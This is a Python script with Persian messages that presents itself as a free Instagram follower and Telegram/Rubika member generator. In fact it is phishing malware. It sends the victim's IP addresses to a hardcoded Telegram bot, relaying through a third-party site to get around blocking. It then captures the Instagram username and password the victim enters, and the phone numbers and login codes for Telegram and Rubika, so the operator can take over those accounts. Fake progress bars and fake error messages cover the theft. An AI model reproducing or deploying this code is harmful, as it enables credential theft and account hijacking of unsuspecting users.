import time
import requests
import socket
from colorama import Fore
from time import sleep


# ip
Host_name = socket.gethostname()
ip_local = socket.gethostbyname(Host_name)
http = requests.get('https://api.ipify.org/').text


# alarm telegram

url3 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + 'بد افزار فعال شد'


# bypass Telegram
pyload = {'UrlBox': url3,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)


# url
url = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
    'آیپی لوکال تارگت : ' + ip_local+'\n'+'آیپی پابلیک تارگت  : '+http


# bypass Telegram
pyload = {'UrlBox': url,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
# print(https)


# snod
url3 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + 'در حال شنود'


# bypass Telegram
pyload = {'UrlBox': url3,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)


# logo help

def help():

    print(Fore.RED+' >>> help script ')

    print(Fore.GREEN+' is help script Enter [ help ] ')
    print(Fore.GREEN+' Enter for [99] and telegram run ')
    print(Fore.GREEN+' Enter for [98] and instagram run ')
    print(Fore.GREEN+' Enter for [97] and rubika run ')
    print('\n')
# user input


# folower insta

def insta():

    # folower instagram

    print(Fore.GREEN+' ___________________________________________________________')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|     version 2.0                                          |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|         follower free instagram                          |')
    print(Fore.GREEN+'|    @miny_hack                                            |')
    print(Fore.GREEN+'|     aparat.com/miny_345                                  |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|      page instagram follow kamiar167                     |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+' ___________________________________________________________')

    url4 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'کاربر وارد قسمت فالور اینستا شد  '
    pyload = {'UrlBox': url4,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> kamiar167')
    instagram = input(' Enter username : ')
    password = input(' Enter password : ')

    url1 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'نام کاربری :  '+instagram+'\n'+'پسورد :  '+password

    pyload = {'UrlBox': url1,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)

    random = [Fore.CYAN + ' conected for instagram 15%', ' conected for instagram 30%', ' conected for instagram 36%', ' conected for instagram 37%',
              ' conected for instagram 50%', ' conected for instagram 60%',
              ' conected for instagram 83%', ' conected for instagram 98%', ' conected for instagram 99%', ' conected for instagram 100%', ' conected to page instagram']

    for i in random:
        print('\r' + i, end='')
        sleep(1)
    print()

    print(Fore.LIGHTYELLOW_EX + ' 1k folowring send page >>> '+instagram)


# member telegram

def telegram():
    from colorama import Fore

    print(Fore.LIGHTMAGENTA_EX +
          ' ___________________________________________________________')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|     version 2.0                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|         member channel telegram free                     |')
    print(Fore.LIGHTMAGENTA_EX +
          '|    channel telegram : @miny_hack                         |')
    print(Fore.LIGHTMAGENTA_EX +
          '|     aparat.com/miny_345                                  |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|      page instagram follow kamiar167                     |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    url5 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'کاربر وارد قسمت ممبر کانال تلگرام شد   '
    pyload = {'UrlBox': url5,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> 09050000000')
    telegram = input(' Enter phone number : ')

    url7 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
           '  اینم شمارش وقتشه تو تلگرام بزنی تا کدشو برات بفرسته    '+telegram
    pyload = {'UrlBox': url7,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    
    code = input(' Enter code telegram : ')

    url6 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'شماره موبایل :  '+telegram+'\n'+'کد ورودی :  '+code

    pyload = {'UrlBox': url6,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    time.sleep(6.5)
    print(Fore.RED+' fgdfg : The term  is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a\
          path was included, verify that the path is correct and try again.\
          At line: 1 char: 1 ')


# member rubika

def rubika():
    print(Fore.MAGENTA +
          ' ___________________________________________________________')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|     version 2.0                                          |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|         member channel Rubika  free                      |')
    print(Fore.MAGENTA +
          '|    channel telegram : @miny_hack                         |')
    print(Fore.MAGENTA +
          '|     aparat.com/miny_345                                  |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|      page instagram follow kamiar167                     |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          ' ___________________________________________________________')
    url10 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'کاربر وارد قسمت ممبر کانال روبیکا شد   '
    pyload = {'UrlBox': url10,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> 09050000000')
    rubika = input(' Enter phone number : ')

    url8 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'بپر شمارشو بزن تا کد بیاد برات اینم شمارش : '+rubika
    pyload = {'UrlBox': url8,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)

    code2 = input(' Enter code  : ')

    url9 = 'https://api.telegram.org/bot5060011146:AAEQ9pgGU9Cw6FTh2kFLYxjAfZdn7J8B4gg/sendMessage?chat_id=2108923270=&text=' + \
        'شماره موبایل :  '+rubika+'\n'+'کد ورودی :  '+code2

    pyload = {'UrlBox': url9,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    time.sleep(5)
    print(Fore.RED + ' extensions\ms-python.python-2021.12.1559732655\pythonFiles\lib\python\debugpy\launcher/../..\debugpy\launcher\__init__.py", line 34, in connect\
        dffdgdgdreturn _run_code(code, main_globals, None ')


print(Fore.RED+'  +---------------------------------+')
print(Fore.GREEN+'  | is help script Enter [ help ]   |')
print(Fore.GREEN+'  | Enter for [99] and telegram run |')
print(Fore.GREEN+'  | Enter for [98] and instagram run|')
print(Fore.GREEN+'  | Enter for [97] and rubika run   |')
print(Fore.RED+'  |                                 |')
print(Fore.RED+'  | follower free instagram         |')
print(Fore.RED+'  |  member free telegram           |')
print(Fore.RED+'  |   member free Rubika            |')
print(Fore.RED+'  |    meno script type >>> [help]  |')
print(Fore.RED+'  | Telegram Channel:T.me/miny_hack |')
print(Fore.RED+'  |                                 |')
print(Fore.RED+'  +---------------------------------+')

Target = input(' Enter options script >>> ')

# if script

if Target == 'help':
    help()
    Target = input(' Enter options script >>> ')
elif Target == '98':
    insta()
elif Target == '99':
    telegram()
elif Target == '97':
    rubika()
else:
    help()
